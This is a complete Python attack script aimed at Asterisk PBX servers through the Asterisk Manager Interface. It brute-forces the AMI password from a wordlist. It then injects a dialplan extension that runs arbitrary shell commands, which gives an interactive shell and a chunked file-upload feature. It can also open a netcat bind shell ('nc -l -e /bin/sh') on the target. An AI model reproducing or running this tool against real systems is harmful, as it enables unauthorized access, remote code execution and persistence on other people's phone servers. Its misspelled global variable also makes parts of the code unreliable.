#!/usr/bin/python

"""
Injected dialplan:

exten=>shell,1,Answer()
same=>n,Set(res=${SHELL(${cmd}):0:-1})
same=>n,Wait(1)
same=>n,Hangup()

exten=>dummy,1,Answer()
same=>n,Wait(1)
same=>n,Hangup()

"""

### Packages required:
# pip install asterisk.ami
# pip install tqdm
###

from asterisk.ami import AMIClient, SimpleAction,EventListener
import time, sys, random, string
import readline
from tqdm import tqdm
import argparse
import socket
import base64

lient = None

waiting_loop = True

class bc:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def generate_random_string(string_len):
    rand_str = lambda n: ''.join([random.choice(string.lowercase) for i in xrange(n)])
    s = rand_str(string_len)  
    return s

def event_notification(source, event):
    global waiting_loop
    le = event['Value']
    for l in le.split('\\n'):
        print l
    print 
    waiting_loop = False
    return True

def send_comand_not_loop(cmd):
    if not cmd:
        return
    action = SimpleAction(
        'Originate',
        Channel='Local/shell@shell_payload',
        Exten='dummy',
        Context='shell_payload',
        Priority='1',
        CallerID='SH',
        Variable='cmd='+cmd,
    )
    future = client.send_action(action)
    if future.response.is_error():
        show_warning_payload(future.response)
        return False
    else:
        return True

def send_command(cmd):
    if not cmd:
        return
    global waiting_loop
    waiting_loop = True
    action = SimpleAction(
        'Originate',
        Channel='Local/shell@shell_payload',
        Exten='dummy',
        Context='shell_payload',
        Priority='1',
        CallerID='SH',
        Variable='cmd='+cmd,
    )
    future = client.send_action(action)
    response = future.response
    if future.response.is_error():
        show_warning_payload(future.response)
 
    while waiting_loop:
        time.sleep(.1)
    return

def send_cli(cmd):
    action = SimpleAction(
        'command',
        Command=cmd
    )
    future = client.send_action(action)
    if future.response.is_error():
        show_warning_payload(future.response)
        return False
    response = future.response
    print response
    return True



def show_warning_payload(msg):
    print bc.FAIL+"Error injecting payload"+bc.ENDC
    print bc.WARNING+str(msg)+bc.ENDC

def inject_payload():
    action = SimpleAction(
        'DialplanExtensionAdd',
        Extension='dummy',
        Context='shell_payload',
        Priority='1',
        Application='Answer',
        Replace='true'
    )
    future = client.send_action(action)
    if future.response.is_error():
        show_warning_payload(future.response)
        return False
    
    action = SimpleAction(
        'DialplanExtensionAdd',
        Extension='dummy',
        Context='shell_payload',
        Priority='2',
        Application='Wait',
        ApplicationData='1',
        Replace='true'   
    )
    future = client.send_action(action)
    if future.response.is_error():
        show_warning_payload(future.response)
        return False

    action = SimpleAction(
        'DialplanExtensionAdd',
        Extension='dummy',
        Context='shell_payload',
        Priority='3',
        Application='Hangup',
        Replace='true'
    )
    future = client.send_action(action)
    if future.response.is_error():
        show_warning_payload(future.response)
        return False

    action = SimpleAction(
        'DialplanExtensionAdd',
        Extension='shell',
        Context='shell_payload',
        Priority='1',
        Application='Answer',
        Replace='true'
    )
    future = client.send_action(action)
    if future.response.is_error():
        show_warning_payload(future.response)
        return False

    action = SimpleAction(
        'DialplanExtensionAdd',
        Extension='shell',
        Context='shell_payload',
        Priority='2',
        Application='Set',
        ApplicationData='res=${SHELL(${cmd}):0:-1}',
        Replace='true'
    )
    future = client.send_action(action)
    if future.response.is_error():
        show_warning_payload(future.response)
        return False

    action = SimpleAction(
        'DialplanExtensionAdd',
        Extension='shell',
        Context='shell_payload',
        Priority='3',
        Application='Wait',
        ApplicationData='1',
        Replace='true'
    )
    future = client.send_action(action)
    if future.response.is_error():
        show_warning_payload(future.response)
        return False

    action = SimpleAction(
        'DialplanExtensionAdd',
        Extension='shell',
        Context='shell_payload',
        Priority='4',
        Application='Hangup',
        Replace='true'
    )
    future = client.send_action(action)
    if future.response.is_error():
        show_warning_payload(future.response)
        return False

    print bc.OKGREEN+"OK"+bc.ENDC
    return True

def input_loop():
    line = ''
    print bc.OKBLUE+"Asterisk runs with user"+bc.ENDC,
    send_command('whoami')
    print "Hostname:",
    send_command('hostname')
    while line.lower() != 'quit' and line.lower() != 'q' and line.lower() != 'exit':
        line = raw_input('[diaplan_shell] $ '+bc.ENDC)
        send_command(line.strip())
    time.sleep(1)    
    client.logoff()

def ami_login(fuser, fpassword, fhost, fport):
    client_local = AMIClient(address=fhost,port=fport)
    res = client_local.login(username=fuser,secret=fpassword)
    if res.response.is_error():
        return False
    global client 
    client = client_local
    return True

def bruteforce(fdict, fhost, fport, fuser, fpass):
    with open(fdict, 'r') as f:
        #lines = f.read().split()
        pbar = tqdm(f.read().split())
        for word in pbar:
            time.sleep(.1)
            
            if ami_login(fuser, word, fhost, fport):
                print
                print 
                print "Password found "+bc.OKBLUE+word+bc.ENDC
                f.close()
                return True
            pbar.set_description("Processing dict")
    f.close()
    print 
    print bc.FAIL+"Password not found"+bc.ENDC
    return False

def shell_netcat(rhost):
    rport = str(raw_input("Remote port: "))
    if not rport.isdigit():
	print "Port must be integer"
	sys.exit(1)
    if not send_comand_not_loop('nc -l -e /bin/sh -p '+rport+' &'):
	print bc.FAIL+"Error setting nc server"+bc.ENDC
        sys.exit(1)

    print "Trying connect with nc server...",
    time.sleep(2)
    try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((rhost, int(rport)))
	
	try :  
		print bc.OKGREEN+"OK"+bc.ENDC
		while 1:  
			cmd = raw_input("[nc-shell] $ "); 
			if cmd.lower() == 'quit' or cmd.lower() == 'q' or cmd.lower() == 'exit': 
				sys.exit(0)
			s.send(cmd + "\n");  
			result = s.recv(1024).strip();  
			if not len(result) :  
				print "[Empty response]"
				s.close();  
				break;  
			print(result);  

	except KeyboardInterrupt:
		print "Closing connection"
		s.close();
	except EOFError:
		print "Closing connection"
		s.close();

    except socket.error:
	    print bc.FAIL+"ERROR"+bc.ENDC
     
def main():
    parser = argparse.ArgumentParser(description='Create AMI shellcode.')
    parser.add_argument('-u', "--username", dest="user", metavar="username", default="admin",
            help='AMI login username [default: admin]')
    parser.add_argument('-p',"--password",  dest='passwd', metavar="password", default=False,
            help='AMI login password')
    parser.add_argument('-d',"--dictionary",  dest='dict', metavar="filename", default="dict.txt",
            help='Dictionary filename [default: dict.txt]')
    parser.add_argument('-H',"--host",  dest='host', metavar="IP/hostname", default=False,
                                help='Asterisk AMI IP/Hostname server')

    parser.add_argument('-P',"--port",  dest='port', metavar="port_server", default=5038,
                                help='Asterisk AMI port')
    parser.add_argument('-c',"--command", dest='command', metavar="command", default=False,
                                help='Send command to Asterisk')
    parser.add_argument('-s',"--shell", dest='shell', action='store_true', default=False,
                                help='Try System Shell')

    parser.add_argument('-f',"--filetoupload", dest='filetoupload', metavar='filetoupload', default=False,
                                help='File to upload')

    args = parser.parse_args()
    opt = parser.parse_args()
    if not opt.host:
        print "It is necessary to set IP/host"
        sys.exit(1)

    try:
        if opt.passwd:
            if not ami_login(opt.user, opt.passwd, opt.host, opt.port):
                print bc.FAIL+"Unable to authenticate"+bc.ENDC
                sys.exit(1)
        else:
            if not bruteforce(opt.dict, opt.host, opt.port, opt.user, opt.passwd):
                sys.exit(1)
        
        if opt.command:
            print
            print "Sending "+bc.OKGREEN+opt.command+bc.ENDC+" command..."
            print
            if send_cli(opt.command):
                sys.exit(0)
            else:
                sys.exit(1)
        elif opt.filetoupload:
            maxsize=512
            print
            print "Uploading "+bc.OKGREEN+opt.filetoupload+bc.ENDC+" file..."
            try:
                with open(opt.filetoupload,'rt') as fu:
                    b64 = base64.b64encode(fu.read())
                    set_upload_dir = raw_input("Select upload directory with '/' (eg.: /usr/local/src/) ")
                    set_upload_name = raw_input("Select upload filename ")
                    client.add_event_listener(EventListener(on_VarSet=event_notification, ChannelStateDesc='Up'))
                    send_command("touch "+set_upload_dir+set_upload_name)
                    pbar = tqdm(b64) 
                    i=0
                    while i < len(b64):
                        buf = b64[i:i+maxsize]
                        if not buf:
                            break
                        send_command("echo '"+buf+"' >> "+"/tmp/"+set_upload_name)
                        pbar.update(512)
                        time.sleep(.2)
                        i=i+maxsize
                    pbar.close()
                    send_command("base64 -d /tmp/"+set_upload_name+" > "+set_upload_dir+set_upload_name+" && rm /tmp/"+set_upload_name)
                    print bc.OKGREEN+"File uploaded!"+bc.ENDC 

            except IOError:
                print bc.FAIL+"File not found"+bc.ENDC
                sys.exit(1)
            except Exception, e:
                print bc.FAIL+str(e)+bc.ENDC

            sys.exit(0)

        elif opt.shell:
            print "Trying "+bc.OKGREEN+"dialplan injection..."+bc.ENDC
        else:
            sys.exit(0)

        if not inject_payload():
            sys.exit(1)
        print
        print bc.OKBLUE+"1 "+bc.ENDC+"- Asterisk Dialplan"
        print bc.OKBLUE+"2 "+bc.ENDC+"- Netcat"
        print
        get_shell = raw_input("What kind of shell you want to try? ")
        if get_shell.isdigit():
            type_shell = int(get_shell)
        else:
            print bc.FAIL+"You must to select a number"+bc.ENDC
            sys.exit(1)

        if type_shell == 1:
            client.add_event_listener(EventListener(on_VarSet=event_notification, ChannelStateDesc='Up'))
            input_loop()
        elif type_shell == 2:
            shell_netcat(opt.host)
        else:
            print bc.FAIL+"Option not found"+bc.ENDC
            sys.exit(1)
    except (KeyboardInterrupt, SystemExit):
        print 
        print "Bye"
        if client:
            client.logoff()

if __name__ == '__main__':
    main()
